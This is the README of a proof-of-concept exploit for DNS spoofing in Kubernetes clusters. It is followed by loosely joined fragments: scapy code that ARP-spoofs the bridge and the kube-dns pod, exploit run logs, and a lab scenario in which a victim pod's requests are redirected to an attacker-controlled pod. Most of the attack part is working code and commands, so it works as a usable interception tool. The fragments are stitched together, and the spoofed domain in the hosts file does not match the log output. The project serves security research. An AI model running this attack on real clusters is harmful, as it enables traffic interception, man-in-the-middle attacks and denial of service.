# Kube-Dnsspoof

Kube-dnsspoof is a POC for DNS spoofing in kubernetes clusters.
This exploit runs with minimum capabilities, on default installations of kuberentes.
This repository contains all files and related code for running this exploit.  

The following video demonstrates how onw can use this to intercept traffic for specifc domains in a cluster:
[![asciicast](https://asciinema.org/a/250310.svg)](https://asciinema.org/a/250310)
Further read on this subject can be done on [this blog post](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

## Prerequisites
A Kubernetes cluster


## Run the exploit
  
First, create the pods by:
    
```bash
$ kubectl create -f pods/
pod/hacker created     
pod/victim created   
```

After the pod was created, exec into the hacker pod. it will contain the exploit and hosts file inside the /dnsspoof folder.

```zsh
$ kubectl exec -it hacker zsh
➜  hacker /dnsspoof ls
exploit.py  hosts
➜  hacker /dnsspoof 
```

Next, edit the hosts file to contain your spoofed domains.
The script will proxy all DNS requests to the real kube-dns pod, except for the entries in the hosts file.  

Example for successful run of the exploit:
```zsh
➜  hacker /dnsspoof ./exploit.py
[*] starting attack on indirect mode
Bridge:  172.17.0.1 c0:0f:fe:eb:4b:e0
Kube-dns:  172.17.0.4 02:42:bb:76:74:f8

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

#### timeouts
When proxying alot of requests, the code can hang. to control this, you can pass a timeout via `--forward-timeout`

The steps of the exploit:
* Deciding whether it can run
* Discovering relevant mac/ip addresses
* ARP spoofing the bridge (and kube-dns in case of direct attack mode)
* DNS proxy requests, and spoofing relevant entries
* Restoring all network on CTRL+C interrupt


root@victim:/# cat /etc/nsswitch.conf | grep hosts
hosts:          files dns

NAME     READY   STATUS    AGE     IP       
hacker   1/1     Running   7h41m   10.42.0.11
victim   1/1     Running   7h22m   10.42.0.12
fake     1/1     Running   7h22m   10.42.0.13


root@victim:/# cat /etc/resolv.conf 
search scenario-3.svc.cluster.local svc.cluster.local cluster.local
nameserver 10.43.0.10
options ndots:5

def get_kube_dns_pod(self):
    kubedns_service_ip = self.get_kube_dns_svc_ip()
    dns_info_res = srp1(Ether() / IP(dst=kubedns_service_ip) / UDP(dport=53) / DNS(rd=1,qd=DNSQR()), verbose=0)
    kubedns_pod_mac = dns_info_res.src 
    self_ip = dns_info_res[IP].dst 
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="{}/24".format(self_ip)),timeout=4, verbose=0)
    for a in ans:
        mac = a[1][ARP].hwsrc
        ip = a[1][ARP].psrc
        # ip matches the mac of kube-dns
        if mac == kubedns_pod_mac:
            return NIC(ip, mac)


def arp_spoofing():
    """ Handles interception kube-dns pod and a specific victim"""
    def intercept_dns_requests():
        # spoofing bridge that we are kube-dns pod
        send(ARP(op=2, pdst = k8s_net.cbr0.ip, psrc = k8s_net.kubedns_pod.ip, hwdst = k8s_net.cbr0.mac), iface=interface, verbose=0)

    def block_real_dns_response(to):
        # spoofing kube-dns traffic to not reach victim due to ip_forwarding - DOS
        send(ARP(op=2, pdst = k8s_net.kubedns_pod.ip, psrc = to.ip, hwdst = k8s_net.kubedns_pod.mac, hwsrc="00:00:00:00:00:00"), iface=interface, verbose=0)

    while True:
        intercept_dns_requests()
        block_real_dns_response(to=victim_pod)
        time.sleep(1)


[+] 10.42.0.12 <- KUBE-DNS response b'example.com.scenario-3.svc.cluster.local.' - 3
[+] 10.42.0.12 <- KUBE-DNS response b'example.com.scenario-3.svc.cluster.local.' - 3
[+] 10.42.0.12 <- KUBE-DNS response b'example.com.svc.cluster.local.' - 3
[+] 10.42.0.12 <- KUBE-DNS response b'example.com.svc.cluster.local.' - 3

root@hacker:/dnsspoof# ls
exploit.py  hosts
root@hacker:/dnsspoof# vi hosts 
google.com. 10.42.0.13

[+] Spoofed response to: 10.42.0.12 | b'example.com.' is at 10.42.0.13
[+] Spoofed response to: 10.42.0.12 | b'example.com.' is at 10.42.0.13

# kubectl exec -it fake bash -n scenario-3
root@fake:/# echo "hello lil hawk" | nc -l -p 80

# kubectl exec -it victim bash -n scenario-3
root@victim:/# curl example.com
<!doctype html>
<html>
<head>
    <title>Example Domain</title>
    ......

# kubectl exec -it hacker bash -n scenario-3
root@hacker:/dnsspoof# ls
exploit.py  hosts
root@hacker:/dnsspoof# python exploit.py 
[*] starting attack on indirect mode
Bridge:  10.42.0.1 16:11:89:12:e6:86 (1)
Kube-dns:  10.42.0.2 ae:5a:e5:ef:f6:19 (2)

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop

root@victim:/# curl example.com
hello lil hawk

# kubectl get pods -n scenario-3 -o wide